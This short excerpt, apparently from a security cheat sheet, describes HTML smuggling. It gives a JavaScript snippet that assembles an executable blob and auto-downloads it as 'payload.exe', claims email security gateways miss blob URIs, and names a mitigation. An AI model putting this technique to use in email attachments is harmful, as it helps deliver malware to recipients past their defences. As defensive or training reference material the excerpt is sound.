- **HTML Smuggling:** Embed malicious **JavaScript** in HTML attachments:
  ```html
  <script>var blob = new Blob(["MZ..."], {type: "octet/stream"});
  var url = URL.createObjectURL(blob);
  var a = document.createElement("a");
  a.href = url;
  a.download = "payload.exe";
  a.click();
  </script>
  ```
- **Bypass:** **SEGs** (e.g., **Mimecast**) fail to inspect **blob URIs**.
- **Mitigation:** **Disarm** HTML emails via **O365 Safe Attachments**.

